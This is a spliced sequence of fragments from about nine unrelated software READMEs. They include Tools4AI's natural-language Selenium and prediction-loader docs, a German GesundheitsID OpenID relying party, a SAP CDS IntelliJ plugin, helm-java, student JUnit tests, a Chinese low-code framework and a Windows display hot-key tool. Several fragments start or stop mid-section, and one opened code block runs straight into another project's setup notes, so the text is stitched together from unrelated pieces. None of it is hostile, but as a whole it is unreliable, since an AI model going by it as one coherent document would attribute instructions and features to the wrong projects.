 boolean buttonPresent =  processor.trueFalseQuery(""do you see Add/Remove Elements?"");
 if(buttonPresent) {
    processor.processWebAction(""click on Add/Remove Elements"");
    // perform other function in simple english
 } //else {
   // processor.processSingleAction(""Create Jira by taking screenshot"");
  // }
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
 boolean isCheckboxPresent =  processor.trueFalseQuery(""do you see Checkboxes?"");
 if(isCheckboxPresent) {
   processor.processWebAction(""click on Checkboxes"");
   processor.processWebAction(""select checkbox 1"");
 }
```
In this example, the ```SeleniumProcessor``` processes commands in plain English and converts them into Selenium 
actions. This approach allows for complex interactions without manually writing Java code for each test. 
Tools4AI serves as a bridge between natural language and Selenium, making it easier to automate UI testing in
a way that is both efficient and intuitive.  

This integration offers substantial benefits for teams looking to streamline their UI validation process.
By enabling a more straightforward way to define and execute Selenium scripts, Tools4AI provides a flexible
framework for automating Selenium-based tests.  

## Spring integration

All the action processors have Spring integration as well 

``` 
SpringAnthropicProcessor springAnthropic = new SpringAnthropicProcessor(applicationContext)
```
``` 
SpringGeminiProcessor springGemini = new SpringGeminiProcessor();
```

```  
SpringOpenAIProcessor springOpenAI = new SpringOpenAIProcessor();
```

You can use this for spring injection and it works exactly as all other action processors , only difference is
that instead of creating new action beans it will reuse the beans already created by spring


look at the example here https://github.com/vishalmysore/SpringActions

## 🧱 Prediction Loaders

### 🔑 Java Prediction Loaders

All the classes implementing ```JavaMethodAction``` interfaces and having annotation ```@Predict``` are added to prediction list
```JavaMethodAction``` is integral to creating all AI-related actions, with each action implemented as a function adhering to the principles of functional programming. The function's name should be descriptive, aligning closely with the action it performs
```@Predict``` Annotation: This annotation ensures that the AIAction object is included in our prediction list. While not mandatory, it's advisable to mark all actions with @Predict for automatic execution. However, for highly customized actions like deleting records or canceling reservations, omitting this annotation might be preferable to prevent automatic execution.

```actionName``` the descriptive name of the primary function within the class. It's crucial to name this function accurately, as AI utilizes semantic mapping at runtime to correlate the function.

```
@Predict(actionName = ""whatFoodDoesThisPersonLike"", description = ""what is the food preference of this person "")
public class SimpleAction implements JavaMethodAction {

    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}

```

So prompt like ```Hey Vishal is coming to my house for dinner``` will automatically trigger method ```whatFoodDoesThisPersonLike``` with ```name``` Vishal

### 🖌️ Shell Prediction Loader  

The prediction loader is responsible for loading command scripts, shell scripts, Python scripts, or any other
type of script from configuration files. It utilizes the actionName field from the configuration to map to 
prompts in real-time. Here's an example configuration entry: 

```
- scriptName: ""test_script.cmd""
  actionName: saveEmployeeInformation
  parameters: employeeName,employeeLocation
  description: This is a command which will save employee information
 ```
During runtime, the prediction loader dynamically extracts parameters from the prompt. Subsequently, it invokes 
the corresponding script based on the action name. Upon execution, the script processes the parameters and 
generates a result, which is then sent back to the AI system.  Finally, the AI system formulates a response based on the received result and provides feedback accordingly.
User: ""Hey, Bahubali joined the IFC and we are so happy.""

In this prompt:

""Hey"" serves as a casual greeting.
""Bahubali"" represents the name of the new joiner, which needs to be extracted as a parameter.
""joined the IFC"" implies an action, where the specifics of the action need to be determined. ""IFC"" is the name of the organization.
""we are so happy"" provides additional context but doesn't directly affect the action to be taken.
The AI system first matches the user's intent with a list of all available actions. In this case, it selects the ""saveEmployeeInformation"" action as the best match. Then, it maps the parameters accordingly: ""Bahubali"" as the employee's name and ""IFC"" as the organization's name. This allows the AI system to accurately understand and execute the user's request.

### ✒️ Swagger Prediction Loader  
<img src=""restapi.png"" >

The Swagger Prediction Loader is capable of directly loading HTTP endpoints as predictions, enabling automatic
execution of commands that semantically match the endpoints with extracted parameters. The screenshot provided
is from https://fakerestapi.azurewebsites.net/index.html, included as an example. Each endpoint within this 
API is converted to an ```HttpPredictedAction``` and dynamically added to the prediction list in real-time by the 
```SwaggerPredictionLoader.``` 

This seamless integration allows for streamlined execution of commands based on the available HTTP endpoints.
**Parsing Swagger/OpenAPI Specification:** The Swagger Prediction Loader reads the Swagger/OpenAPI specification file, which describes the available endpoints, their methods (e.g., GET, POST), parameters, and other details.

**Endpoint Extraction:** The loader extracts each endpoint from the specification, along with its associated metadata such as method, path, parameters, etc.

**Action Mapping:** For each endpoint, the loader creates an HttpPredictedAction object. This action represents the corresponding HTTP operation (e.g., GET, POST) that clients can perform on the endpoint.

**Parameter Extraction:** The loader extracts parameters defined for each endpoint, such as query parameters, path parameters, headers, etc.

**Action Configuration:** The extracted parameters are configured within the HttpPredictedAction object, allowing for dynamic parameterization during execution. Parameters may be mapped to placeholders within the endpoint URL or included in the request body, headers, etc., as specified by the endpoint definition.

**Addition to Prediction List:** Finally, the HttpPredictedAction objects are added to the prediction list, making them available for automatic execution based on user prompts. Users can invoke actions by providing prompts that match the semantic intent of the mapped endpoints, and the system will execute the corresponding HTTP operation with the extracted parameters.

In essence, the Swagger Prediction Loader leverages the structure and metadata defined in the Swagger/OpenAPI
specification to dynamically create HttpPredictedAction objects, allowing for seamless integration of HTTP
endpoints into the prediction system

### ✍️ Http Prediction Loader

```HttpPredictionLoader``` is responsible for loading the manual http endpoint configuration which look something like this 

```{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
```
For the manual definition of HTTP endpoints using a configuration file like the one provided, the process involves specifying each endpoint along with its associated details such as action name, description, URL, HTTP method (type), input parameters, output object, and authentication interface. Here's how the mapping process occurs:

**Configuration File Parsing:** The application parses the configuration file to extract each endpoint definition along with its metadata.

**Endpoint Mapping:** For each endpoint defined in the configuration file, an HttpPredictedAction object is created to represent the corresponding HTTP operation.

**Action Configuration:** The metadata provided in the configuration file is used to configure the HttpPredictedAction object:

**Action Name:** Specifies the name of the action, which serves as a unique identifier.  
**Description:** Provides a brief description of what the action does or its purpose.  
**URL:** Defines the endpoint URL to which the HTTP request will be sent.  
**HTTP Method (Type):** Specifies the HTTP method (e.g., GET, POST) to be used for the request.  
**Input Parameters:** Describes the input parameters required for the HTTP request, such as path parameters, query parameters, etc.  
**Output Object:** Defines the format and structure of the response expected from the endpoint.  
**Authentication Interface:** Specifies the authentication mechanism required to access the endpoint, along with any necessary credentials.  
**Parameter Extraction:** The input parameters defined for each endpoint are extracted and configured within the HttpPredictedAction object.  

**Addition to Prediction List:** Finally, the HttpPredictedAction objects representing the manually defined endpoints are added to the prediction list, making them available for automatic execution based on user prompts.

This approach allows for flexibility in defining HTTP endpoints outside of a Swagger/OpenAPI specification, enabling the manual configuration of endpoints to suit specific application requirements.

### 🖊️ Extended Prediction Loader
The ```ExtendedPredictionLoader``` offers a mechanism for creating custom prediction loaders. While Shell, HTTP, and Java Methods are supported by default, there may arise situations or use cases necessitating a custom set of actions. It's important to note the distinction between custom actions and ```ExtendedPredictedAction.``` Custom actions can be created by implementing the AIAction class, while ExtendedPredictedAction have their own loading mechanism. These actions are already present in the prediction list by default and cannot be predicted again.

To create custom implementations of ExtendedPredictionLoader, you need to annotate the loader class with ```@ActivateLoader.``` Prediction loader will then identify all classes with this annotation and call the ```getExtendedActions()``` method. This method should return the action names along with their corresponding ExtendedPredictOptions, allowing for the seamless integration of custom actions into the prediction system.

## Autonomous Agent 

### Action Script
If you have a complete script written in English , ScriptProcessor will process the script and provide consolidated results

```
 ScriptProcessor script = new ScriptProcessor();
 ScriptResult result =  script.process(""complexTest.action"");
 String resultsString = script.summarize(result)
 log.info(resultsString)

```

Sample script is here

``` 
can you reserve the flight for Vishal from Toronto to Bangalore for 3 Days on 7th december
If flight booking is successful, can you reserve the car for Vishal from Bangalore to Toronto for 10 Days on 17th december
if car booking is successful and flight cost are less than $1000 then book the sight seeing attraction called 5 star palace
if car booking is successful and flight cost are more than $1000 then book the sight seeing attraction called peanut palace
```

## Response Validation

### Hallucination

```ZeroShotHallucinationDetector``` is designed to assess the consistency of responses generated by a Large Language Model (LLM) and detect potential hallucinations. It operates by breaking down an original question into multiple granular questions, each probing different aspects or variations of the inquiry. These granular questions are then presented to the LLM separately, generating responses that are subsequently compared to the original question within its original context.

During comparison, factors such as semantic coherence, relevance, and contextual alignment are evaluated to quantify the consistency between each response and the original question. This evaluation results in a percentage score for each response, representing its level of conformity with the original query.

Finally, these individual percentage scores are aggregated to calculate a cumulative percentage. If the cumulative percentage surpasses a predefined threshold, it indicates a discrepancy or potential hallucination.

By systematically analyzing responses in this manner, the class provides a robust mechanism for assessing the reliability and coherence of LLM-generated content.

This method employs a Zero Shot approach to detect hallucination, utilizing a straightforward methodology devoid of external sources. It operates as follows:

Input: The method takes in responses generated by the Large Language Model (LLM) without relying on any additional data sources.

Granular Analysis: It breaks down the original question into multiple granular inquiries, covering diverse aspects or variations of the initial query.

Zero Shot Evaluation: Without external references, the method evaluates each response against the original question, assessing factors such as semantic coherence and contextual relevance.

Consistency Assessment: Based on the comparison, the method quantifies the consistency of each response, assigning a score indicative of its conformity with the original query.

Cumulative Evaluation: These individual scores are then aggregated to derive a cumulative assessment, providing insight into the overall coherence of the LLM-generated responses.

By employing a simple yet effective Zero Shot technique, this method offers a streamlined approach to detect potential hallucinations in LLM-generated content, contributing to the reliability and trustworthiness of AI-generated outputs.

```

**IMPORTANT:**

- The relying party __MUST__
  be [registered within the OpenID federation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583)
  to work fully.
- In order to register for the federation, your entity statment __MUST__ be publicly available.

Once the server is booted, it will:

1. Expose an OpenID Discovery document at `$EHEALTHID_RP_BASE_URI/.well-known/openid-configuration`
   ```shell
    curl $BASE_URI/.well-known/openid-configuration | jq .
    ```

2. Expose an OpenID Federation entity configuration
   at `$EHEALTHID_RP_BASE_URI/.well-known/openid-federation`
   ```shell
    curl $BASE_URI/.well-known/openid-federation | jwt decode -j - | jq .payload
    ```

3. Be ready to handle OpenID Connect flows and handle them via Germany's GesundheitsID federation.

## Configure Identity Provider

Generic settings:

- the relying party OpenID configuration is at `$ISSUER_URI/.well-known/openid-configuration`
    - token_url: `/auth/token`
    - auth_url: `/auth`
    - jwks_url: `/jwks.json`
- the only supported client authentication is `private_key_jwt`, the public keys will be discovered

## Example: Keycloak OpenID Connect Identity Provider Settings

As an example with `https://t.oviva.io` as the relying party issuer.

# Generate Keys & Register for Federation

In order to participate in the GesundheitsID one needs to register the entity statement of the IDP
or in this case the relying party here.

To simplify matter, here a script to generate fresh keys as well as the XML necessary to register
with Gematik.

See [Gematik documentation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583) for
details on the registration process.

```shell
./cli.sh --help
```

## Authentication flow between all involved parties

**NOTE:** There are some additional interactions within the federation, for a more complete flow see
[AppFlow](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster) in the
Gematik documentation.

# Testing

**See [TESTING](./TESTING.md).**

# Limitations

- for now sessions are stored in-memory, this implies:
    - rebooting the server will force users currently logging-in to restart
    - if multiple instances run, sessions must be sticky (e.g. use `session_id` cookie)
    - though it would be relatively straight forward to use a database instead
- this is tested in the 'Testumgebung' (TU) against the Gematik IDP due to a lack of other options

# Open Points

- end-to-end tests with Verimi, Gematik, RISE and IBM IDPs, most lack options to test currently

# Wishlist

- Accept base URI's with paths.
- MySQL or Postgres backed session and code repos
- PKCE flow on OIDC side
- Integration with other IDPs such as [FusionAuth](https://fusionauth.io/)

<!-- ![IntelliJ Downloads](https://img.shields.io/jetbrains/plugin/d/com.sap.cap.cds) -->

## Description

Welcome to **SAP CDS Language Support for IntelliJ**. It is a plugin for [IntelliJ](https://www.jetbrains.com/idea/) IDEs
that provides editing and development support for the [CDS](https://cap.cloud.sap/docs/cds/) language as used in the SAP Cloud Application Programming Model (CAP).

### Features

Look at our [comprehensive list of features](./FEATURES.md).

![Code Completion](.assets/syntax+completion+diagnostics.png)

## Requirements

### Supported IDEs

This plugin is compatible with the latest **paid** IntelliJ IDEs including IDEA Ultimate and WebStorm.  Check https://www.jetbrains.com/ to find out which option is best for you.

> The LSP API is only available in commercial IntelliJ IDEs, which is why the plugin doesn't run in the free variants (such as IntelliJ Community).

### Operating Systems

Tested on Windows, macOS, and Linux.


## Download and Installation

Prepare your environment:

1. Install [![required Node.js version](https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fwww.unpkg.com%2F%40sap%2Fcds-lsp%2Fpackage.json&query=%24.engines.node&label=Node.js&cacheSeconds=3600)](https://nodejs.org/en/)
   on your computer if not already present.
2. Register the new Node.js installation in your IntelliJ IDE by going to *File > Settings > Languages & Frameworks > Node.js* and [adding the Node.js interpreter](https://www.jetbrains.com/help/idea/node-js-interpreters.html#ws_node_interpreters_dialog_open).
3. If you have installed the SAP CDS Language Support for IntelliJ plugin from a ZIP file before, uninstall it.
     - Note: we have reset the current plugin version to `1.0.0` for the first JetBrains Marketplace release, to clarify that the feature set (based on the current LSP API) is still incomplete.

Install or update the plugin:

1. In your IntelliJ IDE, go to *File > Settings > Plugins*.
2. Click the *Marketplace* tab.
3. Search for ""SAP CDS Language Support"" and click *Install*.

Alternatively, you can install the plugin from the JetBrains Marketplace:

1. Go to the [plugin homepage](https://plugins.jetbrains.com/plugin/25209-sap-cds-language-support) and hit the ""Install to …"" button.
2. Open your IntelliJ IDE and follow the instructions in the dialog that appears.

### Logs

To aid support, please include relevant log files in your report.
Depending on the kind of problem encountered, you may want to include the logs from the **IDE**, the **LSP client** and/or the **LSP server**.

#### IDE Logs

Logs produced by the IDE can be found by opening the *Help* menu and selecting *Show Log in <platform-dependent tool>*.
See [Locating IDE log files](https://intellij-support.jetbrains.com/hc/en-us/articles/207241085-Locating-IDE-log-files) for more information.

#### Language Server Protocol (LSP) Logs

Logging of the stdio communication between the LSP client and server (i.e., the protocol messages) can be activated by modifying your IDE's `vmoptions` file:
- Edit the file specific to your IntelliJ installation by opening the IDE and going to *Help > Edit Custom VM Options...*.
- Add the following line:
```
-DDEBUG=cds-lsp
```

Alternatively, set the following environment variable for your IDE:
```
DEBUG=cds-lsp
```

These settings will also enable debug logging for the LSP server.

After restarting the IDE, find the logs in the [plugin directory](https://intellij-support.jetbrains.com/hc/en-us/articles/206544519-Directories-used-by-the-IDE-to-store-settings-caches-plugins-and-logs), at `lib/cds-lsp/stdio.json`.

#### LSP Client and Plugin Logs

To include debug logs produced by the LSP client (part of the IDE) and the SAP CDS Language Support for IntelliJ plugin, you need to enable the corresponding settings in the IDE:
- Open the *Help* menu and select *Diagnostic Tools > Debug Log Settings…*.
- In the dialog that opens, add the following lines:
```
#com.intellij.platform.lsp
#cds-intellij
```
- Click *OK* to save the settings.

#### LSP Server Logs

The LSP server logs to its own file, which you can locate by opening your system temporary directory, then the sub-folder `cdxlsp`, and finally heading to the file most recently modified at the time of the reported problem.

Hint: depending on your operating system, the temporary directory may be at one of the following locations:

| OS           | Default location                        | Environment variables | Command                            |

![Microcks Testcontainers Spring demo](./assets/microcks-testcontainers-java-spring-demo.png)

This application is a demonstration on how to integrate Microcks via [Testcontainers]([https://www.testcontainers.com]) within your development inner-loop.

You will work with a Spring Boot application and explore how to:
* Use Microcks for **provisioning third-party API mocks**,
* Use Microcks for **simulating external Kafka events publishers**,
* Write tests using Microcks **contract-testing** features for both **REST/OpenAPI based APIs and Events/AsyncAPI** based messaging

manusa/helm-java,main,"# Helm Client for Java

Run Helm commands directly from Java with this client library without the need for a Helm CLI.

It allows you to execute Helm commands directly from Java without requiring a separate Helm installation.
Despite this, it still leverages the native Helm libraries, which are written in Go, to function.
As a result, you can expect the same behavior as you would get from using Helm directly.

## Getting started

Add the dependency to your project:

```xml
<dependency>
  <groupId>com.marcnuri.helm-java</groupId>
  <artifactId>helm-java</artifactId>
  <version>0.0.12</version>
</dependency>
```

Start using it:

```java
public static void main(String... args) {
  new Helm(Paths.get(""path"", ""to"", ""chart"")).install().call();
}
```

Check the features section for more examples and documentation.

### Version

Similar to [`helm version`](https://helm.sh/docs/helm/helm_version/).

Returns the version of the underlying Helm library.

``` java
String version = Helm.version();
```

## Development

### Project Structure

- Go:
  - `native`: contains the Go project that creates the native c bindings
- Java:
  - `helm-java`: contains the actual Helm Java client library
  - `lib`: contains the Java modules related to the native c binding libraries
    - `api`: contains the API for the native interfaces
    - `darwin-amd64`: contains the Java native access library for darwin/amd64
    - `darwin-arm64`: contains the Java native access library for darwin/arm64
    - `linux-amd64`: contains the Java native access library for linux/amd64
    - `linux-arm64`: contains the Java native access library for linux/arm64
    - `windows-amd64`: contains the Java native access library for windows/amd64

### Release Process

#### Release to Maven Central

To release a new version automatically:

```shell
make release V=X.Y.Z VS=X.Y
```
- `V`: New version to release.
- `VS`: New SNAPSHOT version for Maven.

To release a new version manually:

1. Update the version in the `pom.xml` file.
   ```shell
   mvn versions:set -DnewVersion=X.Y.Z -DgenerateBackupPoms=false
   ```
2. Commit and tag the release with the  `pom.xml` version.
   ```shell
   git add .
   git commit -m ""[RELEASE] vX.Y.Z released""
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```
3. Update the version in the `pom.xml` file to the next snapshot version.
   ```shell
   mvn versions:set -DnewVersion=X.Y-SNAPSHOT -DgenerateBackupPoms=false
   ```
4. Commit the changes with the following message:
   ```shell
   git add .
   git commit -m ""[RELEASE] v0.0.11 released, prepare for next development iteration""
   git push origin master
   ```

#### Create GitHub Release

Once the release is published to Maven Central, create a new [GitHub release](https://github.com/manusa/helm-java/releases/new) for the released tag.

### License Headers

Whenever a new file is created, the license header must be added. To add the license header to all files:

```shell
make license
```

# What is Nest Problem?

Given a square piece of material and some letters to be laser-cut:

We want to pack all the letters into the square, using as little material as possible. If a single square is not enough,
we also want to minimize the number of squares used.

In the CNC world this is called ""nesting"", and software that does this is typically targeted at industrial customers and
very expensive.

for more detail , please go to [SVGNest](https://github.com/Jack000/SVGnest)

## The repository based on few github project, I keep the original history of commits.

Also, i have some plane to modify the project. The project will be support DXF file. The SVG format available only for
the preview. The project will be migrate to Kotlin fully or majority.

Fill free to create issues or pull requests. The main goal of the project is mainly free and open source solution for
nesting problem. I try to find the way to compensate the price of cloud server. **You Star of the project can help to
apply to some open source program.**

### Big Thanks to [JeroenGar](https://github.com/JeroenGar)

He is the author of [jagua-rs](https://github.com/JeroenGar/jagua-rs). I use his project as the core service for the

nilsreichardt/gad24-tests,main,"# GAD 24 - Tests

This is a repository to collect JUnit Tests for GAD exercises at TUM in SoSe24. These tests have been written by students for students and are not part of the official course.

## Legal Status

> Es ist alles erlaubt, was die Lösung nicht verrät.

The so-called *Übungsleitung* will have an eye on this repository. But as long as the tests do not reveal the solution of the homework, this repository will tolerate them. To ensure the solution is not getting revealed, the tests should be Input/Output-Tests only.

Furthermore, there is no guarantee of the correctness of the tests. Neither the *Übungsleitung* nor any of the other tutors will contribute own tests. It is your own responsibility to validate the correctness and if necessary report bugs or even provide/contribute a fix for your fellow student.

### Examples

**correct**:
```java
// Test Area calculation
// Arrange
Rectangle r1 = new Rectangle(length: 4, width: 4)
// Act & Assert
assertEquals(16, r1.calculateArea());
```

**wrong!**:
```java
// Test Area calculation
// Arrange
Rectangle r1 = new Rectangle(length: 4, width: 6)
// Act & Assert
// Calculate using length * width             // <-- reveals the solution
assertEquals(4*6, r1.calculateArea()); // <-- reveals the solution
```

## Usage

https://github.com/nilsreichardt/gad24-tests/assets/24459435/6d3126b4-487d-4e40-bdc9-3b15a01170d7

        main {
            java {
                srcDir 'src'
            }
        }
        test {
            java {
                srcDirs = ['test']
            }
        }
    }

    test {
        useJUnitPlatform()
    }

    dependencies {
        testImplementation('org.junit.jupiter:junit-jupiter:5.9.0')
    }
    ```

Parcheng/combine-java,main,"# 介绍
**combine-java** 是一个轻量级低代码框架，在框架中一切的功能皆为组件，您可以自由将各种组件组合在一起进行编排，实现自己的业务功能。<br>
**推荐JDK版本：11+**<br>
<br>

**工程结构：**<br>
**combine-java-core**：核心模块，所有的核心功能都在这里<br>
**combine-java-components**：系统内置组模块 - POM工程<br>
**combine-java-spring-web**：内置了 SpringBoot 的快速使用模块，项目直接通过 pom 引入后即可快速使用。该工程可以直接启动，仅提供了 API 相关的页面和接口<br>
<br>
**系统内置组模块（combine-java-components）包含：**<br>
**combine-java-components-base**: 系统内置组件 - 基础组件包<br>
**combine-java-components-gui**: 系统内置组件 - SWING视图组件包<br>
**combine-java-components-html**: 系统内置组件 - HTML组件包<br>
**combine-java-components-mysql**: 系统内置组件 - MySql数据库组件包<br>
**combine-java-components-redis**: 系统内置组件 - Redis组件包<br>
**combine-java-components-rocketmq**: 系统内置组件 - RocketMQ组件包<br>
<br>

**本地启动并访问 API：**<br>
启动 combine-java-spring-web 工程<br>
组件的API地址：http://127.0.0.1:8888/combine/flow-page/api<br>
<br>

### 流程（FLOW）
**流程**：每个**流程**都有一个KEY（可以理解为请求接口的地址），并由多个**组件**组成（通过编排组件的执行过程来实现接口的业务逻辑，并返回结果）<br>
**组件**：业务功能的最小配置单元，基于输入数据来实现某个功能并将结果输出，它由初始化配置类、逻辑配置类、组件实现类组成<br>
<br>
通过引入 combine-java-components 包，可以使用很多系统内置的公共**组件**<br>
也可以通过 combine-java-core 核心包提供 SPI 机制自定义实现自己的**组件**<br>
<br>
**组件（component）包含三部分：**<br>
**初始化配置**：相当于同类型组件的全局配置，如：MySql 执行组件的数据库连接配置就是初始化配置<br>
**逻辑配置**：相当于组件独立配置，会直接影响组件的执行结果，如：MySql 执行组件要执行的具体SQL和增删改查就是逻辑配置<br>
**组件执行结果**：是组件直接完成后输出的结果<br>
<br>

# 如何使用？
通过 POM 引用 combine-java-spring-web<br>
```$xml
<dependency>
    <artifactId>combine-java-spring-web</artifactId>
    <groupId>com.parch.combine</groupId>
    <version>0.11.0</version>
</dependency>
```

<br>编写一个组件Service，继承核心提供的 AbstractCombineWebService：<br>
```$java
@Service
public class CombineJavaService extends AbstractCombineJavaHandler {
    public CombineWebService() {
        // 这里传入传入全局配置的JSON文件（配置项可参考API）
        super(""config.json"");
    }

    // ... 可以写一些自定义方法 ...
}
```

<br>编写一个 Controller<br>
其中 call 方法是常规接口，uploadAndCall 方法是包含文件上传的接口，page 方法是访问页面<br>
```$java
@RestController
@RequestMapping(""/"")
public class CombineTestController {

    @Autowired
    private CombineJavaService combineWebService;

    @PostMapping(""flow/{domain}/{function}"")
    public FlowResult call(@RequestBody Map<String, Object> params, @PathVariable(name = ""domain"") String domain, @PathVariable(name = ""function"") String function, HttpServletRequest request, HttpServletResponse response) {
        return combineWebService.call(params, domain, function, request, response);
    }

    @PostMapping(""file-flow/{domain}/{function}"")
    public FlowResult uploadAndCall(@RequestParam(""params"") String paramJson, @RequestParam(""file"") MultipartFile file, @PathVariable(name = ""domain"") String domain, @PathVariable(name = ""function"") String function, HttpServletRequest request, HttpServletResponse response) throws IOException {
        return combineWebService.uploadAndCall(paramJson, file, domain, function, request, response);
    }
}
```

<br>编写配置文件 config.json 放在 resource 根目录下：<br>
```$json
{
  ""initConfigs"": [
    ""configs/api_flow.json"",    -- 系统内置的流程配置API（可以不引入）
    ""configs/ui_api_flow.json""  -- 系统内置的UI配置API（可以不引入）
    ""configs/my_business.json""  -- 自己的业务流程配置（可以根据功能模块搞成多个文件）
  ],
  ""initFlows"": [
    ""$init""   -- 自己的业务功能需要项目启动时执行的流程（如：建MySql表，初始化缓存等）
  ],
  ""openRegisterConfig"": false,  -- 是否开放注册，true 表示可以在项目运行期间动态注册流程
  ""requestIdKey"": ""requestID"",  -- 全局 requestId 的 key，方便在日志中进行功能的全链路追踪
  ""printComponentResult"": true  -- 是否打印组件的执行结果
  -- 其他配置详见API
}
```
编写流程配置文件 configs/my_business.json 放在 resource 根目录下：<br>
通过在该文件编写组件配置，来实现自己的业务功能，详见API<br>
<br>

# 自定义组件
通过 SPI 加载<br>
在 resource/META_INFO/services 下创建文件 com.parch.combine.core.component.spi.AbstractGetComponents<br>
```
com.test.components.GetMyComponents
```

<br>创建 GetMyComponents 类：<br>
提示：这里创建的是组件包，一个组件包里会包含多个组件，系统会在加载时会自动扫描 GetMyComponents 类的所在包，获取该包下的所有组件<br>
注意：这个类必须要继承 AbsGetComponents<br>
```
public class GetMyComponents extends AbsGetComponents {
    public GetMyComponents() {
        super(""my"", ""我的组件包"", GetMyComponents.class);
    }
}
```

<br>创建自定义的组件1： My1Component 类<br>
提示：系统是根据 Component 直接来识别组件，该注解定义了组件的类型KEY、组件名称、组件的初始化配置和逻辑配置类<br>
```
@Component(key = ""test1"", name = ""我的组件1"", logicConfigClass = My1LogicConfig.class, initConfigClass = My1InitConfig.class)
@ComponentResult(name = ""我的组件1执行结果"")
public class My1Component extends AbsComponent<My1InitConfig, My1LogicConfig> {

    public DataEnumGetComponent() {
        super(My1InitConfig.class, My1LogicConfig.class);
    }

    @Override
    public FlowResult execute() {
        My1LogicConfig logicConfig = getLogicConfig();
        My1InitConfig initConfig = getInitConfig();

        try {
            ... ...
            return FlowResult.success(result);
        } catch (Exception e) {
            ComponentErrorHandler.print(My1ErrorEnum.FAIL, e);
            return FlowResult.fail(My1ErrorEnum.FAIL);
        }
    }
}
```

<br>创建 My1Component 的初始化配置类和逻辑配置类<br>
```$xslt
public interface My1LogicConfig extends ILogicConfig {

    // 使用 Field 相关注解，可以在访问 API 页面时生成自定义组件的描述信息
    @Field(key = ""key"", name = ""XXXX"", type = FieldTypeEnum.TEXT, isRequired = true)
    @FieldDesc(""XXXXXXXXXXXXXXXXXX"")
    String key();
}

public interface My1InitConfig extends IInitConfig {
    ... 自定义配置项 ...
}
```

<!-- ABOUT THE PROJECT -->

## About The Project

This project was created to circumvent the tedious navigation of the Windows settings menus to change display settings. With Display Hot Keys, the display resolution, bit depth, refresh rate, scaling mode, and DPI scale percentage can be changed for each connected display with user-defined hot keys.

### Common Use Cases

* Switch refresh rates to quickly enable the Black Frame Insertion or Backlight Strobing capabilities of the display.

* Quickly switch between resolutions with different aspect ratios.

* Immediately apply a resolution without entering the in-game menus for video game benchmarking purposes.

* Enlarge or shrink the elements on screen by instantly changing the DPI scale percentage.

* Instantly set a display mode while in a video game. (This is useful if a video game does not support changing the resolution or refresh rate while in-game.)

### Example Screen

![screenshot](product-screenshot.png)

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- GETTING STARTED -->

## Getting Started

This application was made only for the Windows platform. Display Hot Keys also uses elevated privileges to set display modes while in video games. Therefore, if you have UAC enabled, you will get a UAC prompt upon launching the application. If you no longer wish to see this prompt, you can [disable UAC]. The sections that follow will help you get the application up and running on your PC!

### Prerequisites

* Windows 10 x64 or Windows 11 x64 operating system.

* If using multiple displays, then the ""Multiple displays"" setting must be set to ""Extend these displays"" in the Windows ""Display"" settings menu!

### Installation

This application will be distributed as a portable package and as an installer.

#### Portable

1. Download the zip archive.

2. Unzip the archive.

3. Double-click the DisplayHotKeys executable file or create a shortcut to run the application.

#### Installer

1. Download the installer.

2. Run the installer.

3. Follow the installer prompts.

4. Double-click the created shortcut or the DisplayHotKeys executable file in the install directory to run the application.

<p align=""right""><a href=""#readme-top"">Back to Top</a>&thinsp; &#x25B2;</p>

<!-- USAGE -->

## Usage

This application will launch minimized to the system tray in the task bar by design.

### Setting Hot Keys

1. Click the ""Change Hot Key"" button.

2. Press the key combination for the hot key. (Up to three keys can be used!)

3. Release at least one of the keys to set the hot key.

**Note:** A hot key cannot be a subset of another hot key. For example, you cannot have a hot key of ""Ctrl + F1"" and another hot key of ""Ctrl + Shift + F1"". However, a hot key can be the same as another hot key if they are for different displays. This will allow you to apply display settings for multiple displays with one hot key!

### Changing Displays

1. Click the ""Display"" drop-down box.

2. Select the display you want to change hot keys for.

**Note:** The application will automatically detect newly disconnected and connected displays, and the application will refresh to reflect the display configuration change.

### Changing Active Hot Key Slots

1. Click the ""Slots"" drop-down box.

2. Select one of the values.

**Note:** There can be up to 12 active hot key slots for each connected display.

### Changing Display Orientation

1. Click the ""Orientation"" drop-down box.

2. Select one of the following values:
    
    * Landscape - The standard orientation with no rotation.
    
    * Portrait - Mode for 90 degrees display rotation.
    
    * iLandscape - Inverted landscape mode for 180 degrees display rotation.
    
    * iPortrait - Inverted portrait mode for 270 degrees display rotation.

**Note:** Make sure you can rotate your display before changing the orientation; otherwise, it may be difficult to operate your computer.

### Selecting Display Settings

1. Select a display mode value in the ""Display Mode"" drop-down box for the hot key slot.

2. Select a scaling mode value in the ""Scaling Mode"" drop-down box for the hot key slot.

	* Select ""Preserved"" to preserve the aspect ratio of the image.
	
	* Select ""Stretched"" to stretch the image to the edges of the panel.
	
	* Select ""Centered"" to center the image in the middle of the panel.

3. Select a DPI scale percentage value in the ""DPI Scale"" drop-down box for the hot key slot.

**Note:** You may need to use GPU Scaling in your display driver settings to prevent the monitor from overriding the scaling mode.

### Button Interaction

#### Apply Display Mode

The display settings can be immediately applied by clicking on the ""Apply Display Mode"" button for a hot key slot.

#### Clear Hot Key

Individual hot keys can be cleared by clicking on the ""Clear Hot Key"" button for a hot key slot when a hot key is set.

#### PayPal Donate

If you find the application useful and wish to donate, there is a ""PayPal Donate"" button that will open a PayPal donation web page.

#### Change Theme

The theme can be changed between ""Light Mode"" and ""Dark Mode"" by clicking on the ""Change Theme"" button. The icon will change to indicate the current theme.

#### Run On Startup

